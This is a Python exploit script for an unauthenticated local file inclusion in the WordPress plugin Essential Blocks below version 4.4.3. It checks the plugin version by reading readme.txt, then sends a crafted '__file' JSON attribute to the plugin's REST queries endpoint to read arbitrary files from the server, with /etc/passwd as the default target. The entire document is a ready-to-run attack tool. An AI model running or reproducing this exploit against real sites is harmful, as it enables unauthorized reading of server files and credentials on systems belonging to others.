import argparse
import requests
import urllib3
import json
import urllib.parse
import re
import logging





# by Nxploit | Khaled_alenazi





# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Disable SSL verification warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def is_valid_url(url):
    pattern = re.compile(r'^(https?://)([\w.-]+)(:[0-9]+)?(/.*)?$')
    return bool(pattern.match(url))

def normalize_url(url):
    if not re.match(r'^https?://', url):
        url = 'http://' + url  # Default to http if no scheme is provided
    return url.rstrip('/')  # Ensure no trailing slash

def check_plugin_version(url):
    url = normalize_url(url)
    version_url = f"{url}/wp-content/plugins/essential-blocks/readme.txt"
    try:
        response = requests.get(version_url, verify=False)
        response.raise_for_status()
        
        for line in response.text.split('\n'):
            if line.lower().startswith("stable tag:"):
                version = line.split(":")[-1].strip()
                if version <= "4.4.2":
                    logging.info(f"{url} is vulnerable (Stable tag: {version})")
                    return True
                else:
                    logging.info(f"{url} is not vulnerable (Stable tag: {version})")
                    return False
        logging.warning("Version information not found.")
    except requests.exceptions.RequestException as e:
        logging.error(f"Error fetching version info: {e}")
    return False

def generate_payload(file_path):
    return json.dumps({"__file": file_path})

def exploit(url, payload):
    url = normalize_url(url)
    session = requests.Session()
    session.verify = False  # Ignore SSL verification
    
    try:
        full_url = f"{url}/wp-json/essential-blocks/v1/queries"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        
        data = {
            "block_type": "nonexisting_block",
            "query_data": json.dumps({"source": "post"}),
            "attributes": payload
        }
        
        encoded_data = urllib.parse.urlencode(data)
        response = session.get(full_url, headers=headers, params=encoded_data)
        response.raise_for_status()  # Raise HTTP errors
        
        logging.info("Exploit Response:")
        logging.info(response.text)
    except requests.exceptions.RequestException as e:
        logging.error(f"Exploit failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Essential Blocks < 4.4.3 - Unauthenticated Local File Inclusion")
    parser.add_argument("-u", "--url", required=True, help="Target WordPress site URL (e.g., http://192.168.100.74:888/wordpress)")
    parser.add_argument("-p", "--payload", default="/etc/passwd", help="File to read (default: /etc/passwd)")
    
    args = parser.parse_args()
    
    args.url = normalize_url(args.url)  # Ensure URL format is correct
    
    if not is_valid_url(args.url):
        logging.error("Invalid URL format. Make sure it starts with http:// or https://")
    else:
        if check_plugin_version(args.url):
            payload = generate_payload(args.payload)
            exploit(args.url, payload)